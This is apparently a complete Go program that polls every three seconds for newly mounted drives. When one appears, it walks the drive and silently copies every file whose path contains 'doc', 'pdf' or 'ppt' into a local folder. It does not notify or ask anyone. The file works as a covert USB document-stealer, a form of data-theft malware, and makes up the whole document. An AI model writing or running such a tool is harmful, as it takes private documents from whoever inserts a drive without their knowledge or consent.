package main

import (
	"github.com/hugocarreira/go-decent-copy"
	"github.com/jasonlvhit/gocron"
	"github.com/shirou/gopsutil/v3/disk"
	"io/fs"
	"log"
	"os"
	"path"
	"path/filepath"
	"strings"
)

func toMountPoint(partitions []disk.PartitionStat) []string {
	mapped := make([]string, len(partitions))
	for i, value := range partitions {
		mapped[i] = value.Mountpoint
	}
	return mapped
}

func contains(s []string, e string) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}

func compareArray(oldArr []string, newArr []string) []string {
	var s []string
	for _, n := range newArr {
		if !contains(oldArr, n) {
			s = append(s, n)
		}
	}
	return s
}

func findFiles(path string) []string {
	var filePaths []string
	filepath.Walk(path, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if strings.Contains(path, "doc") || strings.Contains(path, "pdf") || strings.Contains(path, "ppt") {
			filePaths = append(filePaths, path)
		}
		return nil
	})
	return filePaths
}

func copyFiles(files []string) {
	execPath, _ := os.Getwd()
	for _, filePath := range files {
		baseFilePath := filepath.Base(filePath)
		err := decentcopy.Copy(filePath, path.Join(execPath, "files", baseFilePath))
		if err != nil {
			log.Fatal(err)
		}
	}
}

var partitions, _ = disk.Partitions(false)
var oldValue = toMountPoint(partitions)

func scanPartitions() {
	partitions, _ := disk.Partitions(false)
	newValue := toMountPoint(partitions)
	addedMountPoint := compareArray(oldValue, newValue)
	if len(addedMountPoint) > 0 {
		for _, mount := range addedMountPoint {
			files := findFiles(mount)
			copyFiles(files)
		}
	}
	oldValue = newValue
}

func main() {
	gocron.Every(3).Second().Do(scanPartitions)
	<-gocron.Start()
}
